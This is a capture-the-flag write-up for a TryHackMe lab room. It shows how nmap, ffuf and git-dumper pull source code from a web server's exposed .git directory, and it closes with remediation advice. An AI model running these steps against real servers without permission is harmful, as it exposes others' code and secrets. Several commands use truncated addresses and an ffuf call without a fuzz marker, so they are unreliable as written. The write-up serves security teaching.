# TryHackMe - Hacker Holidays 2026: Day 2

## Challenge Information
* **Name:** Room 404
* **Category:** Web Exploitation / Source Code Disclosure
* **Difficulty:** Very Easy
* **OS:** Linux
* **Target IP:** `10.128.185.197:8080`

---

## Objective
Analyze the target web application, discover any hidden development artifacts left behind by a rushed administrator, and recover the flag.

---

## 🔍 Step 1: Reconnaissance (Nmap & Enumeration)
To map out the target's attack surface, we start with an active service and configuration scan using `nmap`:

```bash
nmap -sV -sC -Pn 10.128.185.197
```

### Scan Results:
```text
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)  
|_http-title: Byte Lotus — Stay Noticed  
| http-git:   
|   10.128.185.197:8080/.git/  
|     Git repository found!  
|_  Last commit message: initial Byte Lotus guest platform   
```

The scan instantly reveals a high-severity misconfiguration: the web application root contains an exposed **`.git` repository** directory (`http://10.128.185`).

---

## Step 2: Directory Fuzzing
To confirm directory access and see what else might be exposed on the Werkzeug development server, we run a fuzzing pass using `ffuf`:

```bash
ffuf -u http://10.128.185 -w /path/to/wordlist.txt
```

### Ffuf Results:
```text
.git          [Status: 200, Size: 437] 
.git/HEAD     [Status: 200, Size: 21] 
.git/config   [Status: 200, Size: 92] 
.git/index    [Status: 200, Size: 289] 
.git/logs/    [Status: 200, Size: 165]
```
The server gives us full `200 OK` responses for core Git structural components. 

---

## Step 3: Exploitation (.git Repository Dumping)
Standard extraction methods like running `wget` or attempts to execute a direct `git clone` fail because directory listing might be disabled or restricted by the Werkzeug daemon logic.

To bypass this and rebuild the remote Git structure block-by-block, we use an automated open-source extraction tool called **`git-dumper`**:

```bash
# Installing the tool if not present via pip
pip install git-dumper

# Dumping the remote repository into a local folder named '404'
git-dumper http://10.128.185 ~/404
```

The script successfully downloads all loose objects, references, and index structures from the target server, reconstructing the application's offline code history inside our local directory.

---

## Step 4: Post-Exploitation & Flag Extraction
We navigate into the dumped repository directory and inspect the files left in the workspace:

```bash
cd ~/404 && ls -la
```

We locate a development documentation file named `README.md` that was tracked in the repository commit history. Reading its contents drops our target flag:

```bash
cat README.md
```

### Captured Flag:
```text
THM{...}
```

---

## 🛡️ Remediation
* **Production Hardening:** Ensure that development directories, configuration dotfiles (`.git`, `.env`, `.idea`), and backup files are completely excluded from deployment artifacts in production environments.
* **Access Control:** Configure the webserver daemon block rules to explicitly restrict web requests targeting any hidden folder structures (e.g., matching a `~/\.git` regex) by returning a `403 Forbidden` response.
